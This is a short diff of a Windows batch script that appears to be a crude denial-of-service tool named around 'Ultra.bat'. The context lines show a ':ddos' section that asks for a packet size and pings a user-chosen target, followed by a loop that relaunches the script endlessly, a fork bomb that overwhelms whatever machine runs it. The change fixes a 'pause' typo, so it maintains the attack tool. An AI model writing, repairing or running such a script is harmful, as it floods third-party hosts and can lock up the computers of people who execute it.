@@ -59,10 +59,11 @@ goto size
 echo Enter Packet Size
 set /p p= PacketSize:
 echo Press Any Key To Continue
-puase >nul
+pause >nul
 goto :ddos
 color c
 ping %x%
+
 :loop
 start Ultra.bat
 goto loop
